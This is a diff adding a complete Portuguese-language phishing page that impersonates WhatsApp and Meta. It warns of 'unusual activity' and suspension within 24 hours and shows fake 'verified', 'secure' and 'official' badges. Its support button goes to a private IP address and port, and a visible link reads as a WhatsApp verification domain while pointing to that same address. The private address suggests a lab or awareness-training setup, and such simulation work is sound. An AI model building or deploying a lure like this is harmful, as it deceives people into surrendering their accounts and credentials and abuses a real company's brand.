@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp - Verificação de Conta Necessária</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .header {
+            background: #128C7E;
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+
+        .whatsapp-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .meta-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .alert-section {
+            background: #FFF3CD;
+            border: 1px solid #FFEEBA;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .alert-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .alert-icon {
+            color: #856404;
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .alert-title {
+            color: #856404;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .alert-message {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .message-box {
+            background: #F8F9FA;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-left: 4px solid #128C7E;
+        }
+
+        .message-box p {
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .contact-button {
+            display: block;
+            width: 100%;
+            background: #25D366;
+            color: white;
+            text-align: center;
+            padding: 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
+        }
+
+        .contact-button:hover {
+            background: #1DA851;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .button-icon {
+            margin-right: 8px;
+        }
+
+        .link-section {
+            background: #E9ECEF;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .link-section p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .manual-link {
+            color: #128C7E;
+            text-decoration: none;
+            font-weight: 600;
+            word-break: break-all;
+            font-size: 14px;
+        }
+
+        .manual-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #E9ECEF;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .badge-icon {
+            color: #128C7E;
+        }
+
+        .warning-note {
+            background: #FFEAA7;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #856404;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 15px;
+            }
+            
+            .header {
+                padding: 25px 15px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .whatsapp-icon {
+                font-size: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="meta-badge">Meta</span>
+            <i class="fab fa-whatsapp whatsapp-icon"></i>
+            <h1>WhatsApp</h1>
+            <p>Serviço de Verificação de Segurança</p>
+        </div>
+
+        <div class="content">
+            <div class="alert-section">
+                <div class="alert-header">
+                    <i class="fas fa-exclamation-triangle alert-icon"></i>
+                    <div class="alert-title">Verificação de Conta Necessária</div>
+                </div>
+                <div class="alert-message">
+                    Detectamos atividade incomum em sua conta. É necessário verificar suas informações para evitar suspensão.
+                </div>
+            </div>
+
+            <div class="message-box">
+                <p><strong>Prezado usuário,</strong></p>
+                <p>Sua conta do WhatsApp passará por verificações devido a inconsistências/violações nos termos de serviços.</p>
+                <p>Entre em contato com o suporte Meta o mais rápido possível para resolver esta situação.</p>
+            </div>
+
+            <a href="http://192.168.120.128:8003" class="contact-button">
+                <i class="fas fa-headset button-icon"></i>
+                Falar com o Suporte Meta
+            </a>
+
+            <div class="link-section">
+                <p>Se o botão não estiver funcionando, utilize o link abaixo:</p>
+                <a href="http://192.168.120.128:8003" class="manual-link">
+                    http://whatsapp-verification-center.com/account
+                </a>
+            </div>
+
+            <div class="warning-note">
+                <i class="fas fa-clock"></i> Ação necessária dentro de 24 horas
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Meta Platforms, Inc.</p>
+            <p>WhatsApp é uma marca registrada da Meta Platforms, Inc.</p>
+            <div class="security-badges">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt badge-icon"></i>
+                    <span>Verificado</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-lock badge-icon"></i>
+                    <span>Seguro</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-check-circle badge-icon"></i>
+                    <span>Oficial</span>
+                </div>
+            </div>
+            <p style="margin-top: 15px; font-style: italic;">Não responda. Essa mensagem foi gerada automaticamente.</p>
+        </div>
+    </div>
+
+    <script>
+        // Efeitos interativos simples
+        document.addEventListener('DOMContentLoaded', function() {
+            const contactButton = document.querySelector('.contact-button');
+            
+            contactButton.addEventListener('click', function(e) {
+                // Adiciona um pequeno efeito de loading
+                const originalText = this.innerHTML;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Conectando...';
+                this.style.opacity = '0.8';
+                
+                setTimeout(() => {
+                    this.innerHTML = originalText;
+                    this.style.opacity = '1';
+                }, 1500);
+            });
+
+            // Efeito de digitação no título de alerta
+            const alertTitle = document.querySelector('.alert-title');
+            const originalText = alertTitle.textContent;
+            alertTitle.textContent = '';
+            
+            let i = 0;
+            const typeWriter = () => {
+                if (i < originalText.length) {
+                    alertTitle.textContent += originalText.charAt(i);
+                    i++;
+                    setTimeout(typeWriter, 50);
+                }
+            };
+            
+            setTimeout(typeWriter, 1000);
+        });
+    </script>
+</body>
+</html>
